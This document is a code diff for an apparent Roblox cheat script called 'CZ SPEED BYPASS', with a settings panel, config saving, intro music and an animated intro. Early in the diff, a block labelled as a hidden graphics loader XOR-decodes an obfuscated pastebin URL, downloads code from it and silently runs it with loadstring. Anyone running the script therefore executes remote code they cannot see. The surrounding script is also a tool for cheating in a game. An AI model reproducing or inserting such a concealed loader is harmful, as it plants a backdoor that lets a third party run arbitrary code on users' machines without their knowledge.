+        local h = expanded and H_EXPANDED or H_NORMAL
+        panel.Position = UDim2.fromOffset(
+            math.floor(vp.X / 2 - PANEL_W / 2),
+            math.floor(vp.Y / 2 - h / 2)
+        )
+        if queueSave then queueSave() end
+    end
+    lastTitleClick = now
+end)
+-- Hidden anti lag/smooth graphics loader (URL obfuscated)
+task.spawn(function()
+    local function _xorDecode(s)
+        local t = {}
+        for i = 1, #s do
+            local b = string.byte(s, i)
+            local x
+            if bit32 and type(bit32.bxor) == "function" then
+                x = bit32.bxor(b, 23)
+            else
+                local r, bit, a, c = 0, 1, b, 23
+                while a > 0 or c > 0 do
+                    local ab, cb = a % 2, c % 2
+                    if ab ~= cb then r = r + bit end
+                    a = math.floor(a / 2)
+                    c = math.floor(c / 2)
+                    bit = bit * 2
+                end
+                x = r
+            end
+            t[i] = string.char(x)
+        end
+        return table.concat(t)
+    end
+    local ok, src = pcall(function()
+        return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"]nF\\R"))
+    end)
+    if ok and type(src) == "string" and #src > 50 then
+        local fn = loadstring(src)
+        if type(fn) == "function" then
+            pcall(fn)
+        end
+    end
+end)
+--==============================================================
+-- AUTO SAVE
+--==============================================================
+local saveToken = 0
+
+function saveConfig()
+    if type(writefile) ~= "function" then return end
+    local ok, data = pcall(function()
+        return HttpService:JSONEncode({
+            version = 16,
+            name = TITLE_TEXT,
+            power = power,
+            powerText = powerBox.Text,
+            keybind = { kind = bind.kind, code = bind.code, label = bind.label },
+            bg = currentBg,
+            walkSpeed = targetWalkSpeed,
+            position = {
+                x = math.floor(panel.Position.X.Offset),
+                y = math.floor(panel.Position.Y.Offset),
+            },
+            expanded = expanded,
+        })
+    end)
+    if ok and type(data) == "string" then pcall(writefile, CFG_FILE, data) end
+end
+
+function queueSave()
+    if type(writefile) ~= "function" then return end
+    saveToken = saveToken + 1
+    local mine = saveToken
+    task.delay(AUTOSAVE, function()
+        if mine == saveToken then saveConfig() end
+    end)
+end
+
+function loadConfig()
+    if type(isfile) ~= "function" or type(readfile) ~= "function" then return false end
+    local okFile, hasFile = pcall(isfile, CFG_FILE)
+    if not hasFile and type(isfile) == "function" then
+        -- migrate from legacy config if it exists
+        local okLegacy, hasLegacy = pcall(isfile, LEGACY_CFG_FILE)
+        if okLegacy and hasLegacy then
+            pcall(function() writefile(CFG_FILE, readfile(LEGACY_CFG_FILE)) end)
+            hasFile = true
+        end
+    end
+    if not okFile or not hasFile then return false end
+
+    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CFG_FILE)) end)
+    if not ok or type(data) ~= "table" then return false end
+
+    local restored
+    if type(data.powerText) == "string" then restored = parsePower(data.powerText) end
+    if not restored and tonumber(data.power) then restored = parsePower(data.power) end
+    if restored then power = restored end
+    powerBox.Text = formatPower(power)
+    refreshSlider()
+
+    if type(data.keybind) == "table" then
+        local kind  = data.keybind.kind
+        local code  = data.keybind.code
+        local label = data.keybind.label
+        if kind == "none" then
+            setBind("none", "None", "--", false)
+        elseif kind == "mouse" and type(code) == "string" and Enum.UserInputType[code] then
+            setBind("mouse", code, tostring(label or code), false)
+        elseif type(code) == "string" and code ~= "" then
+            local real = Enum.KeyCode[code]
+            if real then setBind("key", code, tostring(label or friendlyKey(code)), false) end
+        end
+    end
+
+    if data.bg then
+        currentBg = tostring(data.bg)
+        bgBox.Text = currentBg
+        updateBg()
+    end
+
+    if tonumber(data.walkSpeed) then
+        targetWalkSpeed = clamp(tonumber(data.walkSpeed), 1, 500)
+        task.defer(applyWalkSpeed)
+    end
+
+    local pos = data.position
+    if type(pos) == "table" and tonumber(pos.x) and tonumber(pos.y) then
+        panel.Position = clampToScreen(tonumber(pos.x), tonumber(pos.y))
+    end
+
+    if data.expanded == true then setExpanded(true, true) end
+    return true
+end
+
+--==============================================================
+-- DEFAULT PLACEMENT
+--==============================================================
+local function defaultPlace()
+    local camera = workspace.CurrentCamera
+    local viewport = camera and camera.ViewportSize or Vector2.new(1280, 720)
+    panel.Position = UDim2.fromOffset(
+        math.floor(viewport.X / 2 - PANEL_W / 2),
+        math.floor(viewport.Y / 2 - H_NORMAL / 2)
+    )
+end
+defaultPlace()
+
+task.spawn(function()
+    local loaded = false
+    local ok, result = pcall(loadConfig)
+    if ok then loaded = result end
+    if not loaded then powerBox.Text = formatPower(power) end
+    refreshSlider()
+    panel.Position = clampToScreen(panel.Position.X.Offset, panel.Position.Y.Offset)
+end)
+
+setRunningVisuals(false)
+refreshKeyBox()
+refreshSlider()
+
+--==============================================================
+-- PANEL REVEAL
+--==============================================================
+revealPanel = function()
+    if panel.Visible then return end
+    local targetSize = UDim2.fromOffset(PANEL_W, expanded and H_EXPANDED or H_NORMAL)
+    panel.Visible = true
+    panel.Size = UDim2.new(0, 0, 0, 0)
+    TweenService:Create(
+        panel,
+        TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+        { Size = targetSize }
+    ):Play()
+    introFinished = true
+    task.defer(applyWalkSpeed)
+end
+
+--==============================================================
+-- INTRO MUSIC
+--==============================================================
+selectedIntroMusic = 4
+_introEnabled = (_introEnabled ~= false)
+
+INTRO_MUSIC_OPTIONS = INTRO_MUSIC_OPTIONS or {
+    {name="Song 1", url="https://files.catbox.moe/mzvrir.mp3", file="Xlu0DuelsIntroSong_1.mp3"},
+    {name="Song 2", url="https://files.catbox.moe/2a7jyx.mp3", file="Xlu0DuelsIntroSong_2.mp3"},
+    {name="Song 3", url="https://files.catbox.moe/rcgr9f.mp3", file="Xlu0DuelsIntroSong_3.mp3"},
+    {name="Song 4", url="https://files.catbox.moe/iknfuh.mp3", file="Xlu0DuelsIntroSong_4.mp3"},
+    {name="Song 5", url="https://files.catbox.moe/6eigoh.mp3", file="Xlu0DuelsIntroSong_5.mp3"},
+    {name="Song 6", url="https://files.catbox.moe/dvjtjk.mp3", file="Xlu0DuelsIntroSong_6.mp3"},
+    {name="Song 7", url="https://files.catbox.moe/iyw1cb.mp3", file="Xlu0DuelsIntroSong_7.mp3"},
+}
+
+introPreviewSound    = nil
+introPlaybackSound   = nil
+introPreviewToken    = 0
+introPlaybackToken   = 0
+introSongCache       = introSongCache or {}
+introSongDownloading = introSongDownloading or {}
+
+function _safeNotify(msg) end
+
+function stopIntroPreview()
+    introPreviewToken = introPreviewToken + 1
+    if introPreviewSound then
+        pcall(function() introPreviewSound:Stop() end)
+        pcall(function() introPreviewSound:Destroy() end)
+        introPreviewSound = nil
+    end
+end
+
+function stopIntroPlayback()
+    introPlaybackToken = introPlaybackToken + 1
+    if introPlaybackSound then
+        pcall(function() introPlaybackSound:Stop() end)
+        pcall(function() introPlaybackSound:Destroy() end)
+        introPlaybackSound = nil
+    end
+end
+
+function cacheIntroSong(option, allowDownload)
+    if not option or not option.url or option.url == "" then return nil end
+    if not (writefile and getcustomasset) then return nil end
+    local fileName = option.file or ("Xlu0DuelsIntroSong_" .. tostring(option.name or "song") .. ".mp3")
+
+    local function loadExisting()
+        if introSongCache[fileName] then return introSongCache[fileName] end
+        local hasFile = false
+        pcall(function() hasFile = isfile and isfile(fileName) end)
+        if hasFile then
+            local ok = pcall(function() introSongCache[fileName] = getcustomasset(fileName) end)
+            if ok and introSongCache[fileName] then return introSongCache[fileName] end
+        end
+        return nil
+    end
+
+    local cached = loadExisting()
+    if cached then return cached end
+    if allowDownload == false then return nil end
+    if introSongDownloading[fileName] then
+        local waitStart = tick()
+        while introSongDownloading[fileName] and tick() - waitStart < 12 do task.wait(0.05) end
+        cached = loadExisting()
+        if cached then return cached end
+    end
+
+    introSongDownloading[fileName] = true
+    local ok = pcall(function()
+        local data = game:HttpGet(option.url)
+        if data and #data > 0 then
+            writefile(fileName, data)
+            introSongCache[fileName] = getcustomasset(fileName)
+        end
+    end)
+    introSongDownloading[fileName] = nil
+    if ok and introSongCache[fileName] then return introSongCache[fileName] end
+    return loadExisting()
+end
+
+function preloadIntroSongs()
+    task.spawn(function()
+        cacheIntroSong(INTRO_MUSIC_OPTIONS[selectedIntroMusic], true)
+        for _, option in ipairs(INTRO_MUSIC_OPTIONS) do
+            if option ~= INTRO_MUSIC_OPTIONS[selectedIntroMusic] then
+                cacheIntroSong(option, true)
+                task.wait(0.05)
+            end
+        end
+    end)
+end
+
+function makeIntroSoundFromId(soundId, name, parent)
+    if not soundId then return nil end
+    local sound = Instance.new("Sound")
+    sound.Name = name or "Xlu0DuelsIntroMusic"
+    sound.Volume = 0.65
+    sound.Looped = false
+    sound.SoundId = soundId
+    sound.Parent = parent or SoundService
+    return sound
+end
+
+function createIntroSound(option, fileName, parent, allowDownload)
+    if not option then return nil end
+    local soundId = cacheIntroSong(option, allowDownload)
+    if not soundId then return nil end
+    return makeIntroSoundFromId(soundId, fileName, parent)
+end
+
+function playIntroMusic()
+    stopIntroPreview()
+    stopIntroPlayback()
+    if not _introEnabled then return end
+    local option = INTRO_MUSIC_OPTIONS[selectedIntroMusic]
+    if not option then return end
+    local token = introPlaybackToken
+    task.spawn(function()
+        local sound = createIntroSound(option, "Xlu0DuelsIntroMusic_" .. tostring(token), SoundService, true)
+        if token ~= introPlaybackToken or not _introEnabled then
+            if sound then pcall(function() sound:Destroy() end) end
+            return
+        end
+        introPlaybackSound = sound
+        if not sound then return end
+        sound.TimePosition = 0
+        local loadStart = tick()
+        while sound and not sound.IsLoaded and tick() - loadStart < 10 do task.wait(0.05) end
+        pcall(function() sound:Play() end)
+        task.delay(15, function() if token == introPlaybackToken then stopIntroPlayback() end end)
+    end)
+end
+
+preloadIntroSongs()
+
+--==============================================================
+-- INTRO ANIMATION
+--==============================================================
+local function runIntro()
+    if not _introEnabled then
+        panel.Visible = true
+        panel.Size = UDim2.fromOffset(PANEL_W, expanded and H_EXPANDED or H_NORMAL)
+        introFinished = true
+        return
+    end
+
+    playIntroMusic()
+
+    task.spawn(function()
+        local DARKER_BG = Color3.fromRGB(5, 5, 8)
+        local WHITE     = Color3.fromRGB(255, 255, 255)
+        local PURPLE    = _G.Xlu0ThemeColors.PURPLE
+
+        local function applyProps(inst, props)
+            for k, v in pairs(props) do
+                if k ~= "Parent" then inst[k] = v end
+            end
+            if props.Parent then inst.Parent = props.Parent end
+            return inst
+        end
+        local function new(class, props) return applyProps(Instance.new(class), props) end
+        local function tw(obj, duration, props, style, dir)
+            local info = TweenInfo.new(duration, style or Enum.EasingStyle.Quad, dir or Enum.EasingDirection.Out)
+            local t = TweenService:Create(obj, info, props); t:Play(); return t
+        end
+
+        local IntroGui = new("ScreenGui", {
+            Name = "CzSpeedBypassIntro",
+            IgnoreGuiInset = true, ResetOnSpawn = false,
+            DisplayOrder = 100, ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+            Parent = PlayerGui,
+        })
+
+        local AdaptIntro = new("Frame", {
+            Name = "AdaptIntro", ZIndex = 1000,
+            Size = UDim2.new(1, 0, 1, 0),
+            BackgroundColor3 = DARKER_BG,
+            BackgroundTransparency = 0.5,
+            BorderSizePixel = 0, Parent = IntroGui,
+        })
+
+        local TojiCutoutStage = new("Frame", {
+            Name = "TojiCutoutStage", Visible = false, ZIndex = 1000,
+            AnchorPoint = Vector2.new(0.5, 0.5),
+            Position = UDim2.new(0.5, 0, 0.5, 0),
+            Size = Xlu0AutoMobile and UDim2.new(0.62, 0, 0.62, 0) or UDim2.new(0.72, 0, 0.72, 0),
+            BackgroundTransparency = 1, BorderSizePixel = 0,
+            Rotation = -2, Parent = AdaptIntro,
+        })
+        new("UIScale", { Parent = TojiCutoutStage })
+
+        new("ImageLabel", {
+            Name = "TojiPantsWhiteFill", ZIndex = 998,
+            AnchorPoint = Vector2.new(0.5, 0.5),
+            Position = UDim2.new(0.5, 0, 0.5, 0),
+            Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1,
+            Image = "rbxassetid://82757811555212", ImageTransparency = 1,
+            ScaleType = Enum.ScaleType.Fit, Parent = TojiCutoutStage,
+        })
+
+        local tojiPieceImages = {
+            "rbxassetid://130451097419605", "rbxassetid://129030262345273",
+            "rbxassetid://76292842640935",  "rbxassetid://82757811555212",
+            "rbxassetid://92910922537368",  "rbxassetid://105960347086002",
+            "rbxassetid://116720305084998", "rbxassetid://90341354549871",
+            "rbxassetid://72399600208480",  "rbxassetid://81834484116440",
+        }
+        local seamOffsets = { {x=-1,y=0}, {x=1,y=0}, {x=0,y=-1}, {x=0,y=1} }
+
+        for i, imageId in ipairs(tojiPieceImages) do
+            for _, offset in ipairs(seamOffsets) do
+                new("ImageLabel", {
+                    Name = "TojiSeamFill" .. i, ZIndex = 999,
+                    AnchorPoint = Vector2.new(0.5, 0.5),
+                    Position = UDim2.new(0.5, offset.x, 0.5, offset.y),
+                    Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1,
+                    Image = imageId, ImageColor3 = DARKER_BG, ImageTransparency = 1,
+                    ScaleType = Enum.ScaleType.Fit, Parent = TojiCutoutStage,
+                })
+            end
+            new("ImageLabel", {
+                Name = "TojiPiece" .. i, ZIndex = 1000,
+                AnchorPoint = Vector2.new(0.5, 0.5),
+                Position = UDim2.new(0.5, 0, 0.5, 0),
+                Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1,
+                Image = imageId,
+                ImageColor3 = (_G.Xlu0ThemeColors and _G.Xlu0ThemeColors[_G.Xlu0ThemeName]) or WHITE,
+                ImageTransparency = 1, ScaleType = Enum.ScaleType.Fit,
+                Parent = TojiCutoutStage,
+            })
+            if i == 2 then
+                local shine = new("ImageLabel", {
+                    Name = "TojiSwordShine", ZIndex = 1001,
+                    AnchorPoint = Vector2.new(0.5, 0.5),
+                    Position = UDim2.new(0.5, 0, 0.5, 0),
+                    Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1,
+                    Image = imageId,
+                    ImageColor3 = (_G.Xlu0ThemeColors and _G.Xlu0ThemeColors[_G.Xlu0ThemeName]) or WHITE,
+                    ImageTransparency = 1, ScaleType = Enum.ScaleType.Fit,
+                    Parent = TojiCutoutStage,
+                })
+                new("UIGradient", {
+                    Rotation = -25,
+                    Transparency = NumberSequence.new({
+                        NumberSequenceKeypoint.new(0, 1, 0),
+                        NumberSequenceKeypoint.new(0.5, 0.14, 0),
+                        NumberSequenceKeypoint.new(1, 1, 0),
+                    }),
+                    Parent = shine,
+                })
+            end
+            if i == 6 then
+                for k = 1, 4 do
+                    new("ImageLabel", {
+                        Name = "TojiMovingHandWhiteFill" .. (k > 1 and k or ""),
+                        ZIndex = 998, AnchorPoint = Vector2.new(0.5, 0.5),
+                        Position = UDim2.new(0.5, seamOffsets[k].x, 0.5, seamOffsets[k].y),
+                        Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1,
+                        Image = imageId, ImageColor3 = WHITE, ImageTransparency = 1,
+                        ScaleType = Enum.ScaleType.Fit, Parent = TojiCutoutStage,
+                    })
+                end
+            end
+        end
+
+        local IntroTitle = new("TextLabel", {
+            Name = "IntroTitle", ZIndex = 1002,
+            AnchorPoint = Vector2.new(0.5, 0.5),
+            Position = UDim2.new(0.5, 0, 0.42, 0),
+            Size = UDim2.new(0, 560, 0, 100),
+            BackgroundTransparency = 1,
+            Text = "CZ SPEED BYPASS",
+            TextColor3 = WHITE,
+            TextStrokeColor3 = Color3.fromRGB(0, 0, 0),
+            TextStrokeTransparency = 0.35,
+            Font = Enum.Font.SciFi,
+            TextSize = 56,
+            TextXAlignment = Enum.TextXAlignment.Center,
+            Parent = AdaptIntro,
+        })
+
+        local titleGlow = Instance.new("UIStroke")
+        titleGlow.Color = PURPLE
+        titleGlow.Thickness = 1.5
+        titleGlow.Transparency = 0.35
+        titleGlow.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
+        titleGlow.Parent = IntroTitle
+
+        local IntroTitleSweep = IntroTitle:Clone()
+        IntroTitleSweep.Name = "IntroTitleSweep"
+        IntroTitleSweep.TextColor3 = PURPLE
+        IntroTitleSweep.TextTransparency = 0
+        IntroTitleSweep.TextStrokeTransparency = 1
+        IntroTitleSweep.ZIndex = IntroTitle.ZIndex + 1
+        IntroTitleSweep.Parent = AdaptIntro
+        _G.CzSpeedBypassIntroTitleSweep = IntroTitleSweep
+
+        local IntroSweepGradient = Instance.new("UIGradient")
+        IntroSweepGradient.Rotation = 12
+        IntroSweepGradient.Offset = Vector2.new(-1.25, 0)
+        IntroSweepGradient.Transparency = NumberSequence.new({
+            NumberSequenceKeypoint.new(0.00, 1),
+            NumberSequenceKeypoint.new(0.42, 1),
+            NumberSequenceKeypoint.new(0.50, 0.08),
+            NumberSequenceKeypoint.new(0.58, 1),
+            NumberSequenceKeypoint.new(1.00, 1),
+        })
+        IntroSweepGradient.Parent = IntroTitleSweep
+
+        task.spawn(function()
+            while IntroTitleSweep and IntroTitleSweep.Parent do
+                IntroSweepGradient.Offset = Vector2.new(-1.25, 0)
+                local sweep = TweenService:Create(
+                    IntroSweepGradient,
+                    TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
+                    { Offset = Vector2.new(1.25, 0) }
+                )
+                sweep:Play()
+                sweep.Completed:Wait()
+                task.wait(0.8)
+            end
+        end)
+
+        new("TextLabel", {
+            Name = "TapAnywhereShadow", ZIndex = 1002,
+            AnchorPoint = Vector2.new(0.5, 0.5),
+            Position = UDim2.new(0.5, 3, 0.42, 61),
+            Size = UDim2.new(0, 300, 0, 38), BackgroundTransparency = 1,
+            Text = "TAP ANYWHERE TO SKIP",
+            TextColor3 = Color3.fromRGB(0, 0, 0), TextTransparency = 0.18,
+            TextSize = 18, Font = Enum.Font.GothamBlack, Parent = AdaptIntro,
+        })
+
+        local TapAnywhereLabel = new("TextLabel", {
+            Name = "TapAnywhere", ZIndex = 1003,
+            AnchorPoint = Vector2.new(0.5, 0.5),
+            Position = UDim2.new(0.5, 0, 0.42, 58),
+            Size = UDim2.new(0, 300, 0, 38), BackgroundTransparency = 1,
+            Text = "TAP ANYWHERE TO SKIP",
+            TextColor3 = WHITE, TextStrokeColor3 = Color3.fromRGB(0, 0, 0),
+            TextStrokeTransparency = 0.45, TextSize = 18,
+            Font = Enum.Font.GothamBlack, Parent = AdaptIntro,
+        })
+
+        new("TextLabel", {
+            Name = "DiscordInviteShadow", ZIndex = 1002,
+            AnchorPoint = Vector2.new(0.5, 0.5),
+            Position = UDim2.new(0.5, 3, 0.42, 85),
+            Size = UDim2.new(0, 250, 0, 34), BackgroundTransparency = 1,
+            Text = "discord.gg/93czvm9Vrt",
+            TextColor3 = Color3.fromRGB(0, 0, 0), TextTransparency = 0.2,
+            TextSize = 16, Font = Enum.Font.GothamBlack, Parent = AdaptIntro,
+        })
+
+        local DiscordInviteLabel = new("TextLabel", {
+            Name = "DiscordInvite", ZIndex = 1003,
+            AnchorPoint = Vector2.new(0.5, 0.5),
+            Position = UDim2.new(0.5, 0, 0.42, 82),
+            Size = UDim2.new(0, 250, 0, 34), BackgroundTransparency = 1,
+            Text = "discord.gg/93czvm9Vrt",
+            TextColor3 = WHITE, TextStrokeColor3 = Color3.fromRGB(0, 0, 0),
+            TextStrokeTransparency = 0.5, TextSize = 16,
+            Font = Enum.Font.GothamBlack, Parent = AdaptIntro,
+        })
+
+        local introTextScaleValue = Xlu0AutoMobile and 0.82 or 1.00
+        for _, obj in ipairs({ IntroTitle, IntroTitleSweep, TapAnywhereLabel, DiscordInviteLabel }) do
+            local sc = Instance.new("UIScale")
+            sc.Name = "Xlu0AutoDeviceScale"
+            sc.Scale = introTextScaleValue
+            sc.Parent = obj
+        end
+        for _, shadowName in ipairs({ "TapAnywhereShadow", "DiscordInviteShadow" }) do
+            local sh = AdaptIntro:FindFirstChild(shadowName)
+            if sh then
+                local sc = Instance.new("UIScale")
+                sc.Name = "Xlu0AutoDeviceScale"
+                sc.Scale = introTextScaleValue
+                sc.Parent = sh
+            end
+        end
+
+        local TapCatcher = new("TextButton", {
+            Name = "TapCatcher", ZIndex = 1004,
+            Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1,
+            Text = "", AutoButtonColor = false, Parent = AdaptIntro,
+        })
+
+        local introSkipped = false
+        local TapAnywhere = AdaptIntro:FindFirstChild("TapAnywhere")
+
+        local function skipIntro()
+            if introSkipped then return end
+            introSkipped = true
+            stopIntroPlayback()
+            _G.CzSpeedBypassIntroTitleSweep = nil
+
+            tw(AdaptIntro, 0.4, { BackgroundTransparency = 1 })
+            for _, child in ipairs(AdaptIntro:GetChildren()) do
+                if child:IsA("ImageLabel") then
+                    tw(child, 0.3, { ImageTransparency = 1 })
+                elseif child:IsA("TextLabel") then
+                    tw(child, 0.3, { TextTransparency = 1 })
+                elseif child:IsA("Frame") then
+                    tw(child, 0.3, { BackgroundTransparency = 1 })
+                    for _, sub in ipairs(child:GetDescendants()) do
+                        if sub:IsA("ImageLabel") then tw(sub, 0.3, { ImageTransparency = 1 }) end
+                        if sub:IsA("TextLabel") then tw(sub, 0.3, { TextTransparency = 1 }) end
+                    end
+                end
+            end
+
+            task.delay(0.45, function()
+                if revealPanel then revealPanel() end
+                if IntroGui then IntroGui:Destroy() end
+            end)
+        end
+
+        TapCatcher.MouseButton1Click:Connect(skipIntro)
+
+        task.spawn(function()
+            task.wait(0.2)
+            if introSkipped then return end
+
+            task.wait(0.6)
+            if introSkipped then return end
+
+            TojiCutoutStage.Visible = true
+            local tojiScale = TojiCutoutStage:FindFirstChild("UIScale")
+            if tojiScale then
+                tojiScale.Scale = 0.78
+                tw(tojiScale, 0.6, { Scale = 1 }, Enum.EasingStyle.Back)
+            end
+
+            local pieceOffsets = {
+                {-42,-26,-10}, {38,-34,9}, {-34,18,-7}, {30,28,8},
+                {-48,6,-11},   {46,10,10}, {-25,38,-6}, {28,42,7},
+                {-18,-44,-5},  {20,-38,5},
+            }
+
+            for i = 1, 10 do
+                if introSkipped then return end
+                local data = pieceOffsets[i]
+                local piece = TojiCutoutStage:FindFirstChild("TojiPiece" .. i)
+                if piece then
+                    piece.Position = UDim2.new(0.5, data[1], 0.5, data[2])
+                    piece.Rotation = data[3]
+                    piece.ImageTransparency = 1
+                    tw(piece, 0.42, {
+                        Position = UDim2.new(0.5, 0, 0.5, 0),
+                        Rotation = 0, ImageTransparency = 0,
+                    }, Enum.EasingStyle.Back)
+                end
+                for _, child in ipairs(TojiCutoutStage:GetChildren()) do
+                    if child.Name == "TojiSeamFill" .. i then
+                        child.Position = UDim2.new(0.5, data[1], 0.5, data[2])
+                        child.Rotation = data[3]
+                        child.ImageTransparency = 1
+                        tw(child, 0.42, {
+                            Position = UDim2.new(0.5, 0, 0.5, 0),
+                            Rotation = 0, ImageTransparency = 0,
+                        }, Enum.EasingStyle.Back)
+                    end
+                end
+                task.wait(0.065)
+            end
+
+            tw(tojiScale, 0.16, { Scale = 1.06 }, Enum.EasingStyle.Quad)
+            task.wait(0.16)
+            tw(tojiScale, 0.24, { Scale = 1 }, Enum.EasingStyle.Back)
+
+            task.spawn(function()
+                while not introSkipped and TojiCutoutStage.Parent do
+                    tw(TojiCutoutStage, 1.15, {
+                        Rotation = 0.8, Position = UDim2.new(0.5, 0, 0.5, -5),
+                    }, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
+                    task.wait(1.15)
+                    if introSkipped or not TojiCutoutStage.Parent then return end
+                    tw(TojiCutoutStage, 1.15, {
+                        Rotation = -0.8, Position = UDim2.new(0.5, 0, 0.5, 5),
+                    }, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
+                    task.wait(1.15)
+                end
+            end)
+
+            task.wait(0.3)
+            if introSkipped then return end
+
+            local shine = TojiCutoutStage:FindFirstChild("TojiSwordShine")
+            if shine then
+                tw(shine, 0.4, { ImageTransparency = 0.2 })
+                task.wait(0.3)
+                if not introSkipped then tw(shine, 0.3, { ImageTransparency = 0.7 }) end
+            end
+
+            task.wait(0.5)
+            if introSkipped then return end
+
+            task.spawn(function()
+                while not introSkipped do
+                    tw(TapAnywhere, 0.8, { TextTransparency = 0.5 })
+                    task.wait(0.8)
+                    if introSkipped then return end
+                    tw(TapAnywhere, 0.8, { TextTransparency = 0 })
+                    task.wait(0.8)
+                end
+            end)
+
+            task.wait(INTRO_HOLD)
+            if not introSkipped then skipIntro() end
+        end)
+    end)
+end
+
+--==============================================================
+-- CONSOLE HELPERS
+--==============================================================
+_G.__CzSpeedBypassRunIntro = runIntro
+_G.__CzSpeedBypassSetWalkSpeed = function(speed)
+    targetWalkSpeed = clamp(tonumber(speed) or TARGET_WALKSPEED, 1, 500)
+    applyWalkSpeed()
+    queueSave()
+end
+_G.__CzSpeedBypassSetPower = function(v)
+    applyPower(tonumber(v) or DEFAULT_POWER, true)
+end
+_G.__CzSpeedBypassSetInterval = function(v)
+    FIRE_INTERVAL = clamp(tonumber(v) or 0.05, 0.01, 2)
+end
+
+--==============================================================
+-- GO
+--==============================================================
+runIntro()
